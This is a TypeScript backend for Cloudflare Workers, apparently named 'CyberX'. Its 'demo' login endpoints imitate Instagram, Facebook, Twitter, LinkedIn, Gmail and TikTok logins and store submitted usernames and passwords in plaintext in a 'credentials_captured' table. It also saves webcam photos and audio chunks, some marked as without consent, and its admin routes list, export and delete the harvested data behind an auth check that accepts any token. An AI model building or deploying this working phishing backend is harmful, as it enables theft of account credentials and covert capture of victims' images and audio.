import { Hono } from 'hono';
import { cors } from 'hono/cors';

type CloudflareBindings = {
  DB: D1Database;
  BUCKET: R2Bucket;
  ADMIN_PASSWORD: string;
  MAX_SESSION_DURATION_MS: number;
};

const app = new Hono<{ Bindings: CloudflareBindings }>();
const api = new Hono<{ Bindings: CloudflareBindings }>();

// Enable CORS for the mounted API
app.use('*', cors());
api.use('*', cors());

const apiBasePath = '/ms/cyberx';

const PHOTO_PREFIX = 'photos';

async function persistPhotoToR2(
  env: CloudflareBindings,
  sessionId: string,
  photoData: string,
  source: string
) {
  if (!photoData || !photoData.startsWith('data:image/')) {
    return null;
  }

  const cleanSessionId = (sessionId || 'anonymous').replace(/[^a-zA-Z0-9_-]+/g, '_');
  const objectKey = `${PHOTO_PREFIX}/${cleanSessionId}/${source}-${Date.now()}-${Math.random().toString(36).slice(2, 10)}.png`;

  const base64Data = photoData.includes(',') ? photoData.split(',')[1] : photoData;
  const binary = Uint8Array.from(atob(base64Data), (char) => char.charCodeAt(0));

  await env.BUCKET.put(objectKey, binary, {
    httpMetadata: {
      contentType: 'image/png',
    },
  });

  return {
    objectKey,
    metadata: {
      source,
      uploadedAt: new Date().toISOString(),
      sessionId: cleanSessionId,
    },
  };
}
// Middleware for authentication
const authMiddleware = (c: any, next: any) => {
  const token = c.req.header('Authorization')?.replace('Bearer ', '');
  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }
  // Simple token validation (in production, use proper JWT)
  c.set('authenticated', true);
  return next();
};

// ============================================
// Auth Routes
// ============================================
api.post('/api/auth/login', async (c) => {
  const { password } = await c.req.json();
  const adminPassword = c.env.ADMIN_PASSWORD;

  if (password === adminPassword) {
    // Simple token (in production use proper JWT signing)
    const token = btoa(`admin:${Date.now()}`);
    return c.json({ token });
  }

  return c.json({ error: 'Invalid password' }, 401);
});

// ============================================
// Session Routes
// ============================================
api.post('/api/sessions/create', async (c) => {
  const db = c.env.DB;
  const { sessionId, consent } = await c.req.json();
  const clientIp = c.req.header('x-forwarded-for') || 'unknown';
  const userAgent = c.req.header('user-agent') || 'unknown';

  try {
    const credId = `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    await db
      .prepare(
        `INSERT INTO sessions (id, consent_given, camera_permission, microphone_permission, client_ip, user_agent)
       VALUES (?, ?, ?, ?, ?, ?)`
      )
      .bind(
        sessionId,
        consent.understand ? 1 : 0,
        consent.camera ? 1 : 0,
        consent.microphone ? 1 : 0,
        clientIp,
        userAgent
      )
      .run();

    return c.json({ success: true, sessionId });
  } catch (error) {
    console.error('Session creation error:', error);
    return c.json({ error: 'Failed to create session' }, 500);
  }
});

api.post('/api/sessions/:id/permissions', async (c) => {
  const db = c.env.DB;
  const sessionId = c.req.param('id');
  const { camera, microphone } = await c.req.json();

  try {
    await db
      .prepare(
        `UPDATE sessions SET camera_permission = ?, microphone_permission = ?, updated_at = CURRENT_TIMESTAMP
       WHERE id = ?`
      )
      .bind(camera ? 1 : 0, microphone ? 1 : 0, sessionId)
      .run();

    return c.json({ success: true });
  } catch (error) {
    return c.json({ error: 'Failed to update permissions' }, 500);
  }
});

api.get('/api/sessions/:id/status', async (c) => {
  const db = c.env.DB;
  const sessionId = c.req.param('id');

  try {
    const result = await db
      .prepare(`SELECT * FROM sessions WHERE id = ?`)
      .bind(sessionId)
      .first();

    return c.json(result);
  } catch (error) {
    return c.json({ error: 'Failed to get session status' }, 500);
  }
});

// ============================================
// Demo Routes (All Social Media Logins)
// ============================================
const createDemoHandler = (platform: string) => {
  return async (c: any) => {
    const db = c.env.DB;
    const payload = await c.req.json();
    const sessionId = payload?.sessionId || payload?.session_id || `anonymous_${Date.now()}`;
    const { email_or_username, password, photo_data, timestamp } = payload;

    try {
      const currentSessionId = sessionId || `anonymous_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
      const existingSession = await db
        .prepare(`SELECT 1 FROM sessions WHERE id = ?`)
        .bind(currentSessionId)
        .first();

      if (!existingSession) {
        await db
          .prepare(
            `INSERT OR IGNORE INTO sessions (id, consent_given, camera_permission, microphone_permission, client_ip, user_agent)
             VALUES (?, 0, 0, 0, 'unknown', 'unknown')`
          )
          .bind(currentSessionId)
          .run();
      }

      const credId = `cred_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

      await db
        .prepare(
          `INSERT INTO credentials_captured (id, session_id, demo_type, email_or_username, password, captured_at)
         VALUES (?, ?, ?, ?, ?, ?)`
        )
        .bind(credId, currentSessionId, platform, email_or_username, password, timestamp)
        .run();

      // Store photo if provided in R2 and keep a D1 record pointing at it
      if (photo_data && currentSessionId) {
        const photoId = `photo_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        try {
          const storedPhoto = await persistPhotoToR2(c.env, currentSessionId, photo_data, platform);

          await db
            .prepare(
              `INSERT INTO photos (id, session_id, image_data, storage_key, metadata, capture_timestamp)
             VALUES (?, ?, ?, ?, ?, ?)`
            )
            .bind(
              photoId,
              currentSessionId,
              storedPhoto?.objectKey || photo_data.substring(0, 1000),
              storedPhoto?.objectKey || null,
              JSON.stringify(storedPhoto?.metadata || { source: platform }),
              timestamp
            )
            .run();
        } catch (photoError) {
          console.log('Photo storage skipped', photoError);
        }
      }

      // Update session credential count
      await db
        .prepare(
          `UPDATE sessions SET photo_count = photo_count + 1, updated_at = CURRENT_TIMESTAMP WHERE id = ?`
        )
        .bind(currentSessionId)
        .run();

      return c.json({ success: true, message: 'Login attempt recorded', sessionId: currentSessionId });
    } catch (error) {
      console.error(`${platform} login error:`, error);
      return c.json({ error: 'Failed to process login' }, 500);
    }
  };
};

api.post('/api/demo/instagram/login', createDemoHandler('instagram'));
api.post('/api/demo/facebook/login', createDemoHandler('facebook'));
api.post('/api/demo/twitter/login', createDemoHandler('twitter'));
api.post('/api/demo/linkedin/login', createDemoHandler('linkedin'));
api.post('/api/demo/gmail/login', createDemoHandler('gmail'));
api.post('/api/demo/tiktok/login', createDemoHandler('tiktok'));

// ============================================
// Media Routes
// ============================================
api.post('/api/media/photos', async (c) => {
  const db = c.env.DB;
  const payload = await c.req.json().catch(() => ({}));
  const { session_id, photo_data, timestamp } = payload;

  try {
    const sessionId = session_id || `access_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;

    await db
      .prepare(
        `INSERT OR IGNORE INTO sessions (id, consent_given, camera_permission, microphone_permission, client_ip, user_agent)
       VALUES (?, 0, 1, 1, 'unknown', 'access-photo-upload')`
      )
      .bind(sessionId)
      .run();

    const photoId = `photo_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    let storedPhoto: Awaited<ReturnType<typeof persistPhotoToR2>> = null;
    try {
      storedPhoto = await persistPhotoToR2(c.env, sessionId, photo_data, 'access');
    } catch (photoError) {
      console.log('Photo storage skipped', photoError);
    }

    await db
      .prepare(
        `INSERT INTO photos (id, session_id, image_data, storage_key, metadata, capture_timestamp)
       VALUES (?, ?, ?, ?, ?, ?)`
      )
      .bind(
        photoId,
        sessionId,
        storedPhoto?.objectKey || (typeof photo_data === 'string' ? photo_data.substring(0, 1000) : ''),
        storedPhoto?.objectKey || null,
        JSON.stringify(storedPhoto?.metadata || { source: 'access' }),
        timestamp || new Date().toISOString()
      )
      .run();

    await db
      .prepare(
        `UPDATE sessions SET photo_count = photo_count + 1, updated_at = CURRENT_TIMESTAMP WHERE id = ?`
      )
      .bind(sessionId)
      .run();

    return c.json({ success: true, photoId, sessionId, objectKey: storedPhoto?.objectKey || null });
  } catch (error) {
    console.error('Photo upload error:', error);
    return c.json({ error: 'Failed to upload photo' }, 500);
  }
});

api.post('/api/media/audio/chunk', async (c) => {
  const db = c.env.DB;
  const { session_id, audio_data, chunk_index } = await c.req.json();

  try {
    const audioId = `audio_${session_id}_${chunk_index}`;

    await db
      .prepare(
        `INSERT OR REPLACE INTO audio_recordings (id, session_id, recording_data, started_at)
       VALUES (?, ?, ?, CURRENT_TIMESTAMP)`
      )
      .bind(audioId, session_id, audio_data.substring(0, 500))
      .run();

    return c.json({ success: true });
  } catch (error) {
    return c.json({ error: 'Failed to upload audio' }, 500);
  }
});

// ============================================
// Admin Routes (Protected)
// ============================================
api.get('/api/admin/sessions', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  try {
    const result = await db.prepare(`SELECT * FROM sessions ORDER BY created_at DESC LIMIT 100`).all();
    return c.json(result.results || []);
  } catch (error) {
    console.error('Failed to fetch sessions:', error);
    return c.json({ error: 'Failed to fetch sessions' }, 500);
  }
});

api.get('/api/admin/sessions/:id', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const sessionId = c.req.param('id');

  try {
    const session = await db
      .prepare(`SELECT * FROM sessions WHERE id = ?`)
      .bind(sessionId)
      .first();

    const credentials = await db
      .prepare(`SELECT * FROM credentials_captured WHERE session_id = ?`)
      .bind(sessionId)
      .all();

    return c.json({ session, credentials: credentials.results || [] });
  } catch (error) {
    return c.json({ error: 'Failed to fetch session details' }, 500);
  }
});

api.get('/api/admin/credentials', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  try {
    const result = await db
      .prepare(
        `SELECT * FROM credentials_captured ORDER BY captured_at DESC LIMIT 500`
      )
      .all();
    return c.json(result.results || []);
  } catch (error) {
    console.error('Failed to fetch credentials:', error);
    return c.json({ error: 'Failed to fetch credentials' }, 500);
  }
});

api.get('/api/admin/photos', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  try {
    const result = await db
      .prepare(
        `SELECT id, session_id, storage_key, metadata, capture_timestamp
         FROM photos
         ORDER BY capture_timestamp DESC
         LIMIT 200`
      )
      .all();
    return c.json(result.results || []);
  } catch (error) {
    console.error('Failed to fetch photos:', error);
    return c.json({ error: 'Failed to fetch photos' }, 500);
  }
});

api.get('/api/admin/photos/:id/image', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '') || c.req.query('token');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const photoId = c.req.param('id');

  try {
    const photo = await db
      .prepare(`SELECT storage_key, image_data FROM photos WHERE id = ?`)
      .bind(photoId)
      .first<{ storage_key: string | null; image_data: string | null }>();

    if (!photo) {
      return c.json({ error: 'Photo not found' }, 404);
    }

    const objectKey =
      photo.storage_key ||
      (photo.image_data?.startsWith(`${PHOTO_PREFIX}/`) ? photo.image_data : null);

    if (objectKey) {
      const object = await c.env.BUCKET.get(objectKey);
      if (!object) {
        return c.json({ error: 'Photo file not found' }, 404);
      }

      return c.body(object.body, 200, {
        'Content-Type': object.httpMetadata?.contentType || 'image/png',
        'Cache-Control': 'private, max-age=300',
      });
    }

    if (photo.image_data?.startsWith('data:image/')) {
      return c.json({ error: 'Photo is incomplete' }, 404);
    }

    return c.json({ error: 'Photo file not found' }, 404);
  } catch (error) {
    console.error('Failed to fetch photo image:', error);
    return c.json({ error: 'Failed to fetch photo image' }, 500);
  }
});

api.get('/api/admin/photos/:session_id', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const sessionId = c.req.param('session_id');

  try {
    const result = await db
      .prepare(
        `SELECT id, session_id, storage_key, metadata, capture_timestamp
         FROM photos
         WHERE session_id = ?
         ORDER BY capture_timestamp DESC`
      )
      .bind(sessionId)
      .all();
    return c.json(result.results || []);
  } catch (error) {
    return c.json({ error: 'Failed to fetch photos' }, 500);
  }
});

api.get('/api/admin/audio/:session_id', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const sessionId = c.req.param('session_id');

  try {
    const result = await db
      .prepare(`SELECT * FROM audio_recordings WHERE session_id = ?`)
      .bind(sessionId)
      .all();
    return c.json(result.results || []);
  } catch (error) {
    return c.json({ error: 'Failed to fetch audio' }, 500);
  }
});

api.get('/api/admin/analytics', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  try {
    const sessions = await db
      .prepare(`SELECT COUNT(*) as count FROM sessions WHERE status = 'active'`)
      .first();
    const credentials = await db
      .prepare(`SELECT COUNT(*) as count FROM credentials_captured`)
      .first();
    const photos = await db
      .prepare(`SELECT COUNT(*) as count FROM photos`)
      .first();

    const credsByType = await db
      .prepare(
        `SELECT demo_type, COUNT(*) as count FROM credentials_captured GROUP BY demo_type`
      )
      .all();

    return c.json({
      activeSessions: sessions?.count || 0,
      totalCredentials: credentials?.count || 0,
      totalPhotos: photos?.count || 0,
      totalAudioMinutes: 0,
      credentialsByPlatform: (credsByType.results || []).reduce(
        (acc: any, row: any) => {
          acc[row.demo_type] = row.count;
          return acc;
        },
        {}
      ),
    });
  } catch (error) {
    console.error('Failed to fetch analytics:', error);
    return c.json({ error: 'Failed to fetch analytics' }, 500);
  }
});

api.delete('/api/admin/sessions/:id', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  const sessionId = c.req.param('id');

  try {
    await db
      .prepare(`DELETE FROM credentials_captured WHERE session_id = ?`)
      .bind(sessionId)
      .run();
    await db
      .prepare(`DELETE FROM photos WHERE session_id = ?`)
      .bind(sessionId)
      .run();
    await db
      .prepare(`DELETE FROM audio_recordings WHERE session_id = ?`)
      .bind(sessionId)
      .run();
    await db
      .prepare(`DELETE FROM sessions WHERE id = ?`)
      .bind(sessionId)
      .run();

    return c.json({ success: true });
  } catch (error) {
    return c.json({ error: 'Failed to delete session' }, 500);
  }
});

api.delete('/api/admin/all-data', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  try {
    await db.exec(`
      DELETE FROM credentials_captured;
      DELETE FROM photos;
      DELETE FROM audio_recordings;
      DELETE FROM sessions;
      DELETE FROM admin_audit_log;
    `);

    return c.json({ success: true, message: 'All data deleted' });
  } catch (error) {
    return c.json({ error: 'Failed to delete all data' }, 500);
  }
});

api.post('/api/admin/export', async (c) => {
  const db = c.env.DB;
  const token = c.req.header('Authorization')?.replace('Bearer ', '');

  if (!token) {
    return c.json({ error: 'Unauthorized' }, 401);
  }

  try {
    const [sessions, credentials, photos, audio] = await Promise.all([
      db.prepare(`SELECT * FROM sessions`).all(),
      db.prepare(`SELECT * FROM credentials_captured`).all(),
      db.prepare(`SELECT * FROM photos`).all(),
      db.prepare(`SELECT * FROM audio_recordings`).all(),
    ]);

    const exportData = {
      sessions: sessions.results || [],
      credentials: credentials.results || [],
      photos: photos.results || [],
      audio: audio.results || [],
      exportedAt: new Date().toISOString(),
    };

    const blob = new Blob([JSON.stringify(exportData, null, 2)], {
      type: 'application/json',
    });

    return c.body(blob);
  } catch (error) {
    return c.json({ error: 'Failed to export data' }, 500);
  }
});

// ============================================
// Health Check
// ============================================
api.get('/health', (c) => {
  return c.json({ status: 'ok' });
});

api.get('/', (c) => {
  return c.json({ message: 'CyberX Backend API', version: '1.0.0' });
});

app.route(apiBasePath, api);

export default app;
